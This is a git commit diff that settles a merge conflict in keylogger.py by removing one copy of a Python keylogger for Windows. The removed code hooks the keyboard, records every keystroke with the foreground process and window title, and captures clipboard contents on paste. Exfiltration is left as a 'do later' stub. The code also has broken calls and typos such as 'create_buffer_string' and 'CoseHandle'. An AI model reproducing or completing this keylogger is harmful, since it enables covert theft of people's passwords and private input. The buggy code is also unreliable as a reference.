0974f986e52d74d18044527080b6bf42f83b767c
Burdi14 <90323807+Burdi14@users.noreply.github.com>
2024-07-12 16:55:05 +0500

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,69 +1,3 @@
-<<<<<<< HEAD
-from ctypes import byref, create_string_buffer, c_ulong, windll
-from io import StringIO
-import os
-import pyWinhook as pyhook
-import pythoncom
-import sys
-import time
-import win32clipboard
-
-TIMEOUT = 10
-
-class Keylogger:
-    def __init__(self):
-        self.current_window = None
-
-    def get_current_process(self):
-        hwnd = windll.user32.GetForegroundWindow()
-        pid = c_ulong(0)
-        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
-        process_id= f'{pid.value}'
-
-        executable = create_string_buffer(512)
-        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
-        windll.psapi.GetWindowBaseNameA(h_process, None, byref(executable), 512)
-        window_title = create_buffer_string(512)
-        try:
-            self.current_window = window_title.value.decode()
-        except UnicodeDecodeError as err:
-            print(f'{err}): window name is known =')
-
-        print('\n', process_id, executable.value.decode(), self.current_window)
-        windll.kernel32.CloseHandle(hwnd)
-        windll.kernel32.CoseHandle(h_process)
-
-    def KeyEvent(self, event):
-        print("testt")
-        if event.WindowName != self.current_window:
-            self.get_current_process()
-        if 32 < event.Ascii < 127:
-            print(chr(event.Ascii), end = "")
-        else:
-            if event.Key == "V":
-                win32clipboard.OpenClipboard()
-                value = win32clipboard.GetClipboardData()
-                win32clipboard.CloseClipboard()
-                print(f'[PASTE]__{value}')
-            else:
-                print(f'{event.Key}')
-        return True
-
-
-def run():
-#    save_stdout = sys.stdout
-#    sys.stdout = StringIO()
-
-    kl = Keylogger()
-    hm = pyhook.HookManager()
-    hm.keyDown = kl.KeyEvent
-    hm.HookKeyboard()
-    pythoncom.PumpMessages()
-#    log = sys.stdout.getvalue()
-#    sys.stdout = save_stdout
-    log = "do later"
-    return
-=======
 from ctypes import byref, create_string_buffer, c_ulong, windll
 from io import StringIO
 import os
@@ -127,4 +61,3 @@ def run():
 #    sys.stdout = save_stdout
     log = "do later"
     return log
->>>>>>> 0b995bfb48cdce227fff3bbee7d11c91d7e77791
